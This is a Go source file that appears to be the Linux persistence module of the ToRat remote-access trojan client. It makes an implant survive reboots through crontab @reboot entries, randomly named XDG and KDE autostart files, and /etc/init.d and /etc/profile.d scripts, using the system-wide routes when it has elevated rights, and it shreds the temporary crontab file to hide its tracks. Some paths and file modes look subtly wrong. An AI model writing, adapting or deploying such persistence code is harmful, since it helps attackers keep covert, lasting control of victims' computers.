package client

import (
	"io/ioutil"
	"os"

	"github.com/lu4p/ToRat_client/crypto"
	"github.com/lu4p/shred"
)

const (
	sh = "#!/bin/sh\n"
)

// Persist makes sure that the executable is run after a reboot
func Persist(path string) {
	elevated := CheckElevate()
	if elevated {
		PersistAdmin(path)
	}
	PersistUser(path)

}

// PersistAdmin persistence using admin privileges
func PersistAdmin(path string) {
	Xdg(path, true)
	Crontab(path)
	ProfileD(path)
	InitD(path)
}

// PersistUser persistence using user privileges
func PersistUser(path string) {
	Xdg(path, false)
	Crontab(path)
}

func Crontab(path string) {
	err := ioutil.WriteFile("tmp", []byte("@reboot "+path), os.ModePerm)
	if err != nil {
		return
	}
	runCmd("crontab tmp", false)
	shred.Conf{Zeros: true, Times: 1, Remove: true}.File("tmp")
}

func Xdg(path string, admin bool) {
	conf := `[Desktop Entry]
Type=Application
Name=` + crypto.GenRandString() + `
Exec=` + path + `
Terminal=false`
	if admin {
		ioutil.WriteFile("/etc/xdg/autostart/"+crypto.GenRandString()+".desktop", []byte(conf), 755)
	} else {
		ioutil.WriteFile("~/.config/autostart/"+crypto.GenRandString()+".desktop", []byte(conf), 755)
	}

}
func KdePlasma(path string) {
	ioutil.WriteFile("~/.config/autostart-scripts/"+crypto.GenRandString()+".sh", []byte(sh+path), 0777)
}

func InitD(path string) {
	ioutil.WriteFile("/etc/init.d/"+crypto.GenRandString(), []byte(sh+path), 755)
}

func ProfileD(path string) {
	ioutil.WriteFile("/etc/profile.d/"+crypto.GenRandString()+".sh", []byte(path), 644)
}
